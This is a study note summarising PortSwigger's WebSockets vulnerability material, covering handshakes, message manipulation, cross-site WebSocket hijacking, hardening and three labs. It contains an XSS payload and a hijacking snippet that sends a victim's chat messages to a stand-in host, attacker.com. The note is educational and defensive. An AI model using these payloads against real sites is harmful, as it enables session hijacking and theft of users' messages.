---
tags: [hacking, web, portswigger, websockets]
type: vulnerability-category
source: https://portswigger.net/web-security/websockets
last-verified: 2026-08-25
---

# WebSockets

## Up
- [[PortSwigger]]

## What it is
WebSockets provide long-lived, bidirectional, asynchronous connections opened over HTTP (via an Upgrade handshake) and then used with `ws://` / `wss://`. Because they carry real-time and often sensitive data, the usual web vulnerabilities apply to both the messages and the handshake.

## The handshake
Established with an HTTP `Upgrade: websocket` request including `Sec-WebSocket-Key` etc. Crucially, the **session context of the connection is determined by the handshake** — including any cookies sent with it. Handshake headers/tokens can go stale and need refreshing while testing.

## Manipulating WebSocket messages
Intercept and edit messages (Burp) to exploit server-side handling. E.g. a chat app sends:
```json
{"message":"Hello Carlos"}
```
rendered as `<td>Hello Carlos</td>`. If output isn't encoded, inject XSS:
```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

## Manipulating the handshake
Look for design flaws in how the handshake is processed:
- Misplaced trust in HTTP headers for security decisions (e.g. spoofing `X-Forwarded-For`).
- Session-handling flaws and extra attack surface in custom handshake headers.

## Cross-site WebSocket hijacking (CSWSH)
A CSRF on the **handshake**: if the handshake is authenticated only by cookies and has no CSRF protection (no unpredictable token, no origin check), an attacker page can open a cross-site WebSocket to the target using the victim's session, then read/send messages. Example exfiltration:
```javascript
var ws = new WebSocket('wss://vulnerable-website.com/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = e => fetch('https://attacker.com/log?m=' + encodeURIComponent(e.data));
```
This can dump the victim's chat history or perform actions as them.

## Prevention / hardening
- Use `wss://` (TLS) and hard-code the endpoint URL (don't build it from a source).
- Protect the handshake against CSRF (unpredictable token and/or strict `Origin` check).
- Treat all received data as untrusted on both ends; encode on output and validate input.

## Labs
3 labs. Verify exact titles against the live page.

| Lab | Difficulty | General approach | Notes |
|---|---|---|---|
| Manipulating WebSocket messages to exploit vulnerabilities | Apprentice | Inject an XSS payload inside a chat message. | |
| Manipulating the WebSocket handshake to exploit vulnerabilities | Practitioner | Spoof `X-Forwarded-For` in the handshake to bypass a filter. | |
| Cross-site WebSocket hijacking | Practitioner | Open a cross-site WS from an attacker page and exfil chat history. | |
